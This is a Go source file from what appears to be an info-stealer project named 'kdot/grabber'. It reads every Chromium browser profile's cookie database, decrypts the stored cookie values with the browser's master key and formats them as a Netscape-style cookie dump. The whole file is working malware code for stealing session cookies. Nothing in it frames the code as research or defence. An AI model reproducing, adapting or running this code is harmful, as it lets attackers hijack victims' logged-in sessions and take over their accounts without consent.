package cookies

import (
	"database/sql"

	"kdot/grabber/browsers/chromium/structs"
	"kdot/grabber/decryption"
)

func Get(browsersList []structs.Browser) string {
	var cookies string
	for _, browser := range browsersList {
		for _, profile := range browser.Profiles {
			path := profile.Cookies

			master_key := decryption.GetMasterKey(browser.LocalState)
			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host_key string
				var name string
				var path_this string
				var encrypted_value []byte
				var expires_utc string
				row.Scan(&host_key, &name, &path_this, &encrypted_value, &expires_utc)
				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
				if err != nil {
					decrypted = string(encrypted_value)
				}
				expired := "TRUE"
				if expires_utc == "0" {
					expired = "FALSE"
				}
				tf_other := "TRUE"
				if host_key[0] == '.' {
					tf_other = "FALSE"
				}
				cookies = cookies + host_key + "\t" + expired + "\t" + path_this + "\t" + tf_other + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
			}
		}
	}
	return cookies
}
